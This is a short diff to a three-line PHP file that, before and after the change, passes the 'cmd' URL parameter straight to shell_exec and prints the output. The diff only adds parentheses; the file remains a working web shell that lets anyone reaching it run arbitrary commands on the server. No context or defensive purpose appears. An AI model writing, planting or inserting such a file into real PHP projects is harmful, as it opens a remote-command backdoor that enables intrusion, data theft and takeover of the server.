@@ -1,3 +1,3 @@
 <?php
-  print shell_exec($_GET['cmd']);
+  print (shell_exec($_GET['cmd']));
 ?>
